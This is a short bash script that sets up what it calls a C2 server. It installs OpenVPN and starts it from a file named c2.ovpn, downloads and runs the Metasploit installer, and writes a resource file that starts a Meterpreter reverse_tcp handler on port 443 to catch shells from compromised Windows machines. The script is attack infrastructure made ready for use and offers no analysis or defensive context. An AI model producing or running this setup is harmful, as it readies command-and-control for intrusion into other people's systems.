#!/bin/bash
#update
apt update
#install curl and openvpn
apt install curl -y
sudo apt install -y openvpn
sudo apt install -y network-manager-openvpn
#prepare certs and launch openvpn as a daemon
openvpn --config /tmp/c2.ovpn --daemon 
#install python
sudo apt-get install -y python3
#install metasploit
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
chmod +x /tmp/msfinstall
/tmp/msfinstall
#Create a ressource file to start your handler quickly upon establishing ssh connection
echo "use exploit/multi/handler" > /tmp/rcFile.rc
echo "set PAYLOAD windows/meterpreter/reverse_tcp" >> /tmp/rcFile.rc
echo "set LHOST 0.0.0.0" >> /tmp/rcFile.rc
echo "set LPORT 443" >> /tmp/rcFile.rc
echo "exploit -j" >> /tmp/rcFile.rc
